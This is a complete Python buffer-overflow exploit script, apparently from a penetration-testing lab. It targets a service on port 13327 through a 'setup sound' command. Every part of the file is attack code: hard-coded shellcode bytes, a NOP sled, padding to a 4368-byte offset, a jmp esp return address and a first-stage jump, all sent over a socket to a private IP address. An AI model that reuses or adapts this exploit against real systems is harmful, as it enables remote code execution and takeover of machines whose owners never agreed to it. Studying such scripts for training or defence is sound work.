#!/usr/bin/python
import socket

nop_sled  =  "\x90" * 8 # NOP sled
shellcode =  b""
shellcode += b"\xd9\xe8\xbe\x50\x30\x3c\xd8\xd9\x74\x24\xf4"
shellcode += b"\x58\x2b\xc9\xb1\x12\x31\x70\x17\x03\x70\x17"
shellcode += b"\x83\x90\x34\xde\x2d\x21\xee\xe9\x2d\x12\x53"
shellcode += b"\x45\xd8\x96\xda\x88\xac\xf0\x11\xca\x5e\xa5"
shellcode += b"\x19\xf4\xad\xd5\x13\x72\xd7\xbd\x63\x2c\x50"
shellcode += b"\xfc\x0c\x2f\x9f\xef\x90\xa6\x7e\xbf\x4f\xe9"
shellcode += b"\xd1\xec\x3c\x0a\x5b\xf3\x8e\x8d\x09\x9b\x7e"
shellcode += b"\xa1\xde\x33\x17\x92\x0f\xa1\x8e\x65\xac\x77"
shellcode += b"\x02\xff\xd2\xc7\xaf\x32\x94"

host = "192.168.193.44"

offset      = "\x41" * (4368 - len(nop_sled) - len(shellcode))
eip         = "\x96\x45\x13\x08" # 08134596 (jmp esp)
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90" # Fills 7 bytes - jumps to EAX+12, and 2 NOPS
buffer      = "\x11(setup sound " + nop_sled + shellcode + offset + eip + first_stage + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print("[*] Sending evil buffer...")

s.connect((host, 13327))
print(s.recv(1024))

s.send(buffer)
s.close()

print("[*] Payload sent!")
